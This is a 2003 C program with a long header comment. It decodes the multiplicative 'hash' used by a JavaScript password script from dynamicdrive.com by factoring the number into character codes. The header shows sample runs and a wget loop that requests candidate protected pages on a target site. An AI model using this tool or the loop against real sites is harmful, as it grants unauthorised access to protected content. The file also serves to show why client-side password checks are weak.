/*
 * jscript-decode.c
 *
 *  Update: 07/09/2003
 *  THIS IS THE UPDATED FIXED VESION 
 *  ============================================================================
 *  The original was not very accurate (among other things). Had to randomize 
 *  the array for better results. The first time you run this and it does not 
 *  get you the decoded hash, run the app agian etc.., untill the decoded charaters 
 *  are printed. I was going to automate it but spent too much time on it 
 *  already. The permutation code has been comented out. If you want it to 
 *  spit out all the permutations then uncomment it. Agian, i could make this 
 *  user friendly, but i need a break from this thing :). I may in the 
 *  future. :)
 *
 *  ==============================================================================
 *
 *
 *  This program decodes weak username/password that are encoded using the javascript
 *  code found on dynamicdrive.com (http://www.dynamicdrive.com/dynamicindex9/password.htm)
 *  It states on the page that "In general JavaScript password scripts are significantly 
 *  less secure..". Since the decoded hash is in no particular order this program will also 
 *  spit out all permutations. 
 *
 *  There are a few things to note:
 *
 *  1: The max hash vaule acceped by Perl/C seems to be "49077072127303940".
 *     So basicly a user/pass of "zzzzzzzzz" can't be decoded using this program. 
 *
 *     If we have a hash of "2.9384419904780827e+35" wich is "zzzzzzzzzzzzzzzzz"
 *     we obviously can't use that hash easily here. however, at this point
 *     the original hash function in the code is just comparing strings
 *     and authentication will succeed.
 *
 *     I tested hashes using a javascript calc and was able to decode 
 *     "2.9384419904780827e+35" to "zzzzzzzzzzzzzzzzz" by hand, 
 *     (http://javascript.internet.com/calculators/advanced.html) with 
 *     some serious patience one can always go that route. :)
 *
 *  2: The program currently supports only lowercase letters [a-z].
 *     and numbers [0-9] I'll probubly add '.', and '-' later on. 
 *     and mabee all special chars.
 *
 *     If the original javascript code from the link above is used 
 *     un-modified it is possible that somone will only name the protected 
 *     page using lowercase letters. Of couse the orginal java script code 
 *     can be changed so that once 'authenticated', it will take you to a 
 *     page un-realted to the password. But then you may see it anyway.
 *
 *  3: Some decoded hashes will result in different username/passwordds. 
 *     This is because of the way the hashes are created. for example
 *     say we have a password of abcd to get the hash simply multiply
 *     a * b * c * d = (number hash). 
 *
 *     So the resulting number from "abcd0qw" and "abcdfq8" is "60743476886400".
 *     entering "abcd0qw" or "abcdfq8" as a password will pass authentication.
 *     
 *
 *  Acknowledgments
 *
 *  Ian Lyte <ianlyte@hotmail.com> 
 *  Michael Sconzo <msconzo@tamu.edu>
 *  Jon Guthrie (permutation code) 
 *
 * 
 * Todo
 *   - add special charaters to the mix
 *   - add a link verifier
 *   - clean up code
 *
 * Tested 
 *    Red Hat Linux release 7.3
 *    C99 & gcc 
 *
 * Compile: 
 *    gcc -Wall -lm -o jscript-decode jscript-decode.c
 *
 * Usage
 *       pass12 == 352007180000
 *
 *
 * [nocon@ decode]$ ./jscript-decode 352007180000
 * Got numbers, randomizing...
 * Got it!
 * Decoded hash: pa1ss2
 * Password length: 6
 * [nocon@ decode]$ 
 *
 *  Verify Links:
 *  Small script w/ "wget"  (enable the permutation code at bottom)
 *
 * [nocon@ decode]$ ./jscript-decode 352007180000 > paswds.txt
 * [nocon@ decode]$
 *
 *  #!/bin/sh
 *  for page in `cat ./paswds.txt`; do
 *        wget "http://www.site.com/path/$page.htm"
 *  done
 *
 *
 *  - nocon
 *    http://nocon.darkflame.net
 *    07/07/2003
 *
 *
 */


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <math.h>
#include <time.h>
#include <unistd.h>

/* program cannot handle hashes larger than
 * "49077072127303940" Pass: zzzzzzzz.
 */
#define MAX_HASH 49077072127303940

#define MIN 97
#define MAX 122


int charcmp(char *a, char *b)
{
  return(*a - *b);
}


/*
 *  This function prints all of the permutations of string "array"
 *  (which has length "len") starting at "start."
 */
void permute(char *array, int start, int len)
{
 int j;
 char *s;

       if(start < len) {
	       if(NULL == (s = malloc(len))) {
		       printf("\n\nMemory error!!!\a\a\n");
		       exit(-1);
	       }

	       strcpy(s, array);
	       for(j=start ; j<len ; ++j) {
		       int temp;
		       if((j == start) || (s[j] != s[start])) {
			        /* For each character that's different    */
			        /* Swap the next first character with...  */
			        /* the current first                      */
			        temp = s[j];
				s[j] = s[start];
				s[start] = temp;
				permute(s, start+1, len);
		       }
	       }
	       free(s);
       }
	else puts(array);
}	       


int main (int argc, char* argv[]) 
{
 unsigned long long num;
 int numbers[100];
 char letters[100];
 char *end;
 int temp,i,n,x,r,c,q,index,len;

index=0; 
n=0; 
       
         if(argc != 2) {
	        printf("Usage: %s <hash>\n",argv[0]);
	        exit(-1);
	   }

    num = strtoull(argv[1],&end,0);

         if(num > MAX_HASH ) {
	      printf("Cannot calculate numbers that size.\n");
	      exit(-1);
	}
	
	 /* numbers 0-9 */ 
	  for(i=48;i<=57;i++) {
		  if(fmod(num,i) == 0) {
			  numbers[n] = i;
		          n++;
		  }
	  }	  

         /* letters a-z  */
          for(i=MIN;i<=MAX;i++) {
		  if(fmod(num,i) == 0) {
			 numbers[n] = i;
			 n++;
		  }

	  }
	 
	  n = (n-1);
	  /* for(i=0;i<=n;i++) { printf("Dec: %d Char: %c",numbers[i],numbers[i]);  printf("\n"); } */
               
              printf("Got numbers, randomizing...\n");	     
                
                 /* randomize the array */
                 for(i=0;i<=n;i++) {
			 sleep(1);
			 srand(time(NULL));
			 r = rand() % n;
			 temp = numbers[i];
			 numbers[i] = numbers[r];
			 numbers[r] = temp;
		 }

                 
	/* for(i=0;i<=n;i++) { printf("Dec: %d Char: %c",numbers[i],numbers[i]);  printf("\n"); } */

                    for(x=0;x<=n;x++) {
				for(c=0;c<=n;c++) {
					while(fmod(num,numbers[c]) == 0 && (num /= numbers[c])) {
						/* printf("%llu\n",num);*/ 
						letters[index] = numbers[c];
						index++;
					}
				/*  printf("Char: %c\n",numbers[c]); */
				}

			  temp = numbers[0];
			  for(q=0;q<=(n-1);q++) { numbers[q] = numbers[q+1]; }
			  numbers[q] = temp;

			   /* if(num !=1) { index = 0; } */
			   if(num == 1) { letters[index] = '\0';
				    /* printf("%s\n",letters); */
				    /* index = 0; */
				    /* break out of the loop, we only need one string */
				    break; 
			   } 
			   index = 0;
			   num = strtoull(argv[1],&end,0); 
			}

                    /*******************************************************************/
                   
                    len = strlen(letters);
		    if(num != 1) {
			    printf("Didn't get it. run it through the program agian.\n");
		    } else {
			    printf("Got it!\n");
			    printf("Decoded hash: %s\n",letters);
                            printf("Password length: %d\n",len);

                          /* permutation code, only works if they're printed in order */
                          /* 
	                     qsort(letters,len,1,(int(*)(const void *, const void *))charcmp);
	                     permute(letters,0,len); 
                           */
		    }

 return(0);
}
